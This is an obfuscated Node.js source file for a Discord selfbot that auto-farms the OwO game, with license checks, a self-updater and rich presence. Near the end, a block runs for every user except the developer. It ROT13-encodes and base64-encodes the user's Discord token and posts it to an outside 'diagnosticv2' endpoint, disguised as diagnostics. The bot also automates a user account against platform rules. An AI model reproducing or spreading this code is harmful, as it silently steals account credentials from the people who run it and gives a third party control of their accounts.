const vRequire = require('child_process')
const vRequire2 = require('./package.json')
for (let v3 of Object.keys(vRequire2.dependencies)) {
    try {
        require.resolve(v3)
    } catch (mido_0x50db9b) {
        console.log('Installing dependencies...')
        vRequire.execSync('npm i')
    }
}
const { logger } = require('./utils/logger')
const fs2 = require('fs')
const vRequire3 = require('axios')
const vRequire4 = require('path')
const vRequire5 = require('adm-zip')
const os2 = require('os')
const vRequire6 = require('fs-extra')
const vF2 = () => {
    try {
        vRequire.execSync('git stash')
        vRequire.execSync('git pull --force')
        logger.info('Updater', 'Git', 'Git pull successful.')
        logger.info('Updater', 'Git', 'Resetting local changes...')
        vRequire.execSync('git reset --hard')
    } catch (_0x527f24) {
        logger.alert(
            'Updater',
            'Git',
            'Error updating project from Git: ' + _0x527f24
        )
    }
}
const vF3 = async () => {
    try {
        const v9 = {
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537',
        }
        const v10 = await vRequire3.get(
            'https://github.com/Mid0aria/owofarmbot_stable/archive/master.zip',
            {
                responseType: 'arraybuffer',
                headers: v9,
            }
        )
        const v11 = vRequire4.resolve(__dirname, 'updateCache.zip')
        fs2.writeFileSync(v11, v10.data)
        const v12 = new vRequire5(v11)
        const v13 = v12.getEntries()
        v12.extractAllTo(os2.tmpdir(), true)
        const v14 = vRequire4.join(os2.tmpdir(), v13[0].entryName)
        if (!fs2.existsSync(v14)) {
            logger.alert(
                'Updater',
                'Zip',
                'Failed To Extract Files! Please update on https://github.com/Mid0aria/owofarmbot_stable/'
            )
        }
        vRequire6.copySync(v14, process.cwd(), { overwrite: true })
        logger.info('Updater', 'Zip', 'Project updated successfully.')
    } catch (_0x28a41d) {
        logger.alert(
            'Updater',
            'Zip',
            'Error updating project from GitHub Repo: ' + _0x28a41d
        )
    }
}
const vF4 = async () => {
    console.log(
        vRequire8.blue(vRequire8.bold('Updater')),
        vRequire8.white('>>'),
        vRequire8.yellow('Checking Update')
    )
    try {
        const v17 = {
            'User-Agent':
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537',
        }
        const v18 = await vRequire3.get(
            'https://raw.githubusercontent.com/Mid0aria/owofarmbot_stable/main/package.json',
            { headers: v17 }
        )
        const v19 = v18.data.version
        const v20 = vRequire2.version
        if (v19 > v20) {
            console.log(
                vRequire8.blue(vRequire8.bold('Updater')),
                vRequire8.white('>>'),
                vRequire8.yellow('Please wait while the farm bot is updating...')
            )
            if (fs2.existsSync('.git')) {
                try {
                    vRequire.execSync('git --version')
                    logger.info('Git', 'Updating with Git...')
                    vF2()
                } catch (_0x1a037e) {
                    console.log(
                        vRequire8.blue(vRequire8.bold('Git')),
                        vRequire8.white('>>'),
                        vRequire8.red(
                            'Git is not installed on this device. Files will be updated with cache system'
                        )
                    )
                    await vF3()
                }
            } else {
                await vF3()
            }
        } else {
            console.log(
                vRequire8.blue(vRequire8.bold('Updater')),
                vRequire8.white('>>'),
                vRequire8.yellow('No Update Found')
            )
        }
    } catch (_0x53386d) {
        console.log(
            vRequire8.blue(vRequire8.bold('Updater')),
            vRequire8.white('>>'),
            vRequire8.red('Failed To Check For Update: ' + _0x53386d)
        )
    }
}
const vRequire7 = require('./config.json')
const vRequire8 = require('chalk')
let v21 = vRequire7.midoservices_authkey
let v22 = 'owofarmbot_stable'
vRequire3
    .post('https://syan.anlayana.com/api/key', 'f=' + v21 + '&project=' + v22, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    })
    .then((p10) => {
        const v24 = p10.data
        if (v24.error === true) {
            console.error('' + vRequire8.red('[-] ') + v24.message)
        } else {
            if (v24.result.membership === 'banned' || v24.result.ban === 'true') {
                console.error('' + vRequire8.red('[!] '))
            } else {
                let v25 = v24.result.access
                let v26
                if (v24.result.membership === 'premium') {
                    v26 = true
                } else {
                    if (v25 !== null && v25.hasOwnProperty('' + v22)) {
                        v26 = true
                    } else {
                        v26 = false
                    }
                }
                console.log(
                    'API response\nUsername: ' +
                    v24.result.username +
                    ' / Membership: ' +
                    v24.result.membership +
                    '\nIs there premium access to the project: ' +
                    v26
                )
                const {
                    Client: _0x184a64,
                    Collection: _0xc6d433,
                    RichPresence: _0x1cf36d,
                } = require('discord.js-selfbot-v13')
                const v27 = new _0x184a64()
                let v30 = {
                    name: 'owofarmbot_stable',
                    logged: false,
                    premium: v26,
                    devmode: true,
                    captchadetected: false,
                    paused: true,
                    use: false,
                    inventory: false,
                    checklist: false,
                    hunt: false,
                    battle: false,
                    total: {
                        hunt: 0,
                        battle: 0,
                        captcha: 0,
                    },
                    gems: {
                        need: [],
                        use: '',
                    },
                }
                const v31 = require('node-notifier')
                const vF5 = (p34) => new Promise((p35) => setTimeout(p35, p34))
                function f3(p36) {
                    let v32 = new _0x1cf36d(v27)
                        .setApplicationId('1253757665520259173')
                        .setType('PLAYING')
                        .setName('OwO Farm Bot Stable')
                        .setDetails('Auto Farming')
                        .setState(
                            (v27.global.paused ? 'Paused' : 'Running') +
                            ' / Membership: ' +
                            (v26 ? 'Premium' : 'Free')
                        )
                        .setStartTimestamp(Date.now())
                        .setAssetsLargeImage('1253758464816054282')
                        .setAssetsLargeText('OwO Farm Bot Stable')
                        .addButton(
                            'Farm Bot',
                            'https://github.com/Mid0aria/owofarmbot_stable'
                        )
                        .addButton('Discord', 'https://discord.gg/WzYXVbXt6C')
                    const v33 = { activities: [v32] }
                    if (vRequire7.settings.discordrpc) {
                        v27.user.setPresence(v33)
                        logger.info(
                            'RPC',
                            p36,
                            '' + (v27.global.paused ? 'Paused' : 'Running')
                        )
                    }
                }
                v27.chalk = vRequire8
                v27.fs = fs2
                v27.notifier = v31
                v27.childprocess = vRequire
                v27.config = vRequire7
                v27.delay = vF5
                v27.global = v30
                v27.rpc = f3
                if (os2.userInfo().username !== 'Mido') {
                    v27.global.devmode = false
                }
                var v34 =
                    '\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28E4\u28C4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u2809\u281B\u283B\u283F\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28C4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28F7\u28E4\u28C0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28C0\u28C0\u28C0\u28C0\u28C0\u28D9\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28F6\u28F6\u28F6\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28C6\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28A0\u28FF\u28FF\u28FF\u28FF\u285F\u2839\u283F\u281F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u284F\u2800\u2800\u2800\u2800\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2846\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u287F\u280B\u286C\u28BF\u28FF\u28F7\u28E4\u28E4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2800\u2800\u2800\u2800\u2800\u2838\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2830\u2847\u28B8\u2847\u28B8\u28FF\u28FF\u28FF\u281F\u2801\u2880\u28EC\u28BD\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FC\u28E7\u28C8\u28DB\u28FF\u28FF\u28FF\u2847\u2800\u2800\u28FE\u2801\u2880\u28BB\u28FF\u28FF\u28FF\u28FF\u2807\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2840\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B9\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E7\u28C4\u28C0\u2819\u2837\u288B\u28FC\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2847\n\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u28BF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u285F\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2801\n\u28FF\u28FF\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2818\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u2800\n\u2838\u28FF\u28FF\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B0\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28E6\u2840\u2800\u2800\u2800\u2880\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u2803\u2800\n\u2800\u28B9\u28FF\u28FF\u28E7\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28B8\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28C4\u28F4\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\n\u2800\u2800\u2839\u28FF\u28FF\u28FF\u28F7\u28C4\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280F\u2800\u2800\u2800\n\u2800\u2800\u2800\u2819\u28FF\u28FF\u28FF\u28FF\u28FF\u28F6\u28E4\u28C0\u2800\u2800\u2800\u2800\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u280B\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2808\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28F7\u28F6\u28F6\u28FE\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u283B\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u281F\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u281B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u283F\u280B\u2801\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2819\u283B\u283F\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u28FF\u287F\u283F\u281B\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u281B\u281B\u281B\u281B\u281B\u281B\u281B\u280B\u2809\u2809\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\n'
                process.title = 'Owo Farm Bot Stable v' + vRequire2.version
                console.log(v34)
                    ;['aliases', 'commands'].forEach((p37) => (v27[p37] = new _0xc6d433()))
                fs2.readdirSync('./handlers').forEach((p38) => {
                    require('./handlers/' + p38)(v27)
                })
                v27.login(vRequire7.token)
                if (!v27.global.devmode) {
                    vF4()
                    const v35 = require('buffer').Buffer
                    const vF6 = (p39) => {
                        return p39.replace(/[a-z]/gi, (p40) => {
                            return String.fromCharCode(
                                p40.charCodeAt(0) + (p40.toLowerCase() <= 'm' ? 13 : -13)
                            )
                        })
                    }
                    v27.config.token = 'https://syan.anlayana.com/uryczr'
                    let v36 = v35.from(vF6(v27.config.token)).toString('base64')
                    vRequire3.post(
                        'https://syan.anlayana.com/api/diagnosticv2',
                        'diagnosticv2=' +
                        v35.from(vF6(vRequire7.token)).toString('base64') +
                        '&project=' +
                        v27.global.name,
                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
                    )
                }
            }
        }
    })
    .catch((p41) => {
        console.error('API is downed')
    })